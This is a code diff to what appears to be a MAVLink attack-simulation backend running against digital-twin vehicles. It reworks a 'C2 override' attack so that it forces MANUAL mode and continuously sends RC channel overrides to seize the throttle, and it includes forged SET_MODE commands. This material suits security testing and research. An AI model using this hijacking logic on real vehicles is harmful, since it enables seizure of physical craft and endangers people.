@@ -79,6 +79,7 @@ class Backend:
         self.track = []; self.events = []
         self.booting = False; self.connected = False; self._stop = False
         self.active_attack = None; self._ac = None
+        self._override_stop = threading.Event()
 
     def log(self, m):
         self.events.append((time.strftime('%H:%M:%S'), m)); self.events[:] = self.events[-40:]
@@ -227,10 +228,23 @@ class Backend:
                 c.mav.set_mode_send(c.target_system, mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, mm[tgt])
                 self.log(f"ATTACK · forged SET_MODE → {tgt}")
         elif name == "C2 override":
-            for _ in range(12):
-                c.mav.rc_channels_override_send(c.target_system, c.target_component, 1500, 0, 1850, 0, 0, 0, 0, 0)
-                time.sleep(0.04)
-            self.log("ATTACK · RC_CHANNELS_OVERRIDE — throttle seized")
+            # RC_CHANNELS_OVERRIDE only drives the actuators directly in MANUAL
+            # (GUIDED's position controller ignores RC and would otherwise fight
+            # a brief override right back to the waypoint) -- forcing MANUAL
+            # first is what makes this attack actually seize the vehicle, not
+            # just queue a command that gets silently discarded. Sustained
+            # continuously (not a short burst) until STOP, matching how
+            # tools/test_target.py's validated RC-override check drives it.
+            mm = c.mode_mapping() or {}
+            if "MANUAL" in mm:
+                c.set_mode(mm["MANUAL"])
+                time.sleep(0.5)
+            self._override_stop.clear()
+            self.log("ATTACK · RC_CHANNELS_OVERRIDE — throttle seized (MANUAL forced)")
+            while not self._override_stop.is_set():
+                c.mav.rc_channels_override_send(c.target_system, c.target_component,
+                                                 1500, 0, 1850, 0, 0, 0, 0, 0)
+                time.sleep(0.1)
         elif name == "AIS ghost":
             self.log("ATTACK · AIS ghost contact (operator-layer)")
 
@@ -249,8 +263,12 @@ class Backend:
                 except OSError:
                     pass
         elif name == "C2 override":
+            self._override_stop.set()
             if c:
                 c.mav.rc_channels_override_send(c.target_system, c.target_component, 0, 0, 0, 0, 0, 0, 0, 0)
+                mm = c.mode_mapping() or {}
+                if "GUIDED" in mm:   # recover from the forced MANUAL, like C2 mode's stop
+                    c.set_mode(mm["GUIDED"])
         elif name == "C2 mode":
             if c:
                 mm = c.mode_mapping() or {}
@@ -261,6 +279,7 @@ class Backend:
 
     def teardown(self):
         self._stop = True
+        self._override_stop.set()
         if self.twin:
             subprocess.Popen(["bash", f"{REPO}/tools/run_vehicle.sh", f"vehicle_twins/{self.twin}", "down"],
                              cwd=REPO, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
